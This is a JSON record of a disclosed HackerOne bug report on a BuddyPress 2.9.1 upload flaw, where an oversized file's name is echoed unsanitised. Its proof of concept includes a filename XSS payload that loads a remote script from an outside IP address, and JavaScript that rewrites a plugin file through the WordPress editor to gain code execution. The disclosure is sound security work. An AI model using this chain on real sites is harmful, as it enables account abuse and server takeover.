{
  "id": 263109,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjMxMDk=",
  "url": "https://hackerone.com/reports/263109",
  "title": "Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-08-24T22:55:44.354Z",
  "submitted_at": "2017-08-24T22:55:44.354Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skansing",
    "url": "/skansing",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 55,
    "url": "https://hackerone.com/wordpress",
    "handle": "wordpress",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WordPress",
      "twitter_handle": "wordpress",
      "website": "https://wordpress.org/",
      "about": "Beautiful sites of any kind."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-11-02T17:04:35.375Z",
  "bug_reporter_agreed_on_going_public_at": "2017-11-02T17:02:53.537Z",
  "team_member_agreed_on_going_public_at": "2017-11-02T17:04:35.296Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Description\nThis report is very similar to https://hackerone.com/bugs?subject=user&report_id=203515 so I will not go into too much details.\n\nWhen uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.\n\nThe interfaces for upload that are vuln can be found at\ndomain.tld/members/USERNAME/profile/change-cover-image/\ndomain.tld/members/bbuser/profile/change-avatar/\ndomain.tld/wp-admin/users.php?page=bp-profile-edit\n \n# POC\nThe POC explores a chain of XSS => XSSI => RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions\n\n- Login as admin\n- Goto `/wp-admin/users.php?page=bp-profile-edit`\n- Upload a file with the following name (mentioned below) as admin for.\n\nFilename \n`POC<img src=x onerror='document.write(atob(\"UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=\"))'>`\n\nThe base64 data can be verified by\n`btoa('Running POC<script type=\"text/javascript\" src=\"http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js\"></script>');` in the browser conole.\n\nThis scripts loads the RCE script that changes the hello.php with <?php phpinfo() and redirect to it.\n```\nvar i = document.createElement(\"iframe\");\ni.src = \"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\";\ndocument.querySelector(\"body\").appendChild(i);\nsetTimeout(function() {\n  var p = \"<?php phpinfo();\"\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n```\n\n# Suggested fix\nSanitize the error. I suspect it needs a run through `.html()` as in #203515\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-12-02T17:02:53.975Z",
  "allow_singular_disclosure_after": -195594350.6340539,
  "singular_disclosure_allowed": true,
  "vote_count": 14,
  "voters": [
    "jokebookservice1",
    "jdgrimes",
    "jensec",
    "bl4de",
    "skansing",
    "eveeez",
    "khizer47",
    "cr4xerbik4sh",
    "japz",
    "0xm1racle",
    "and 4 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
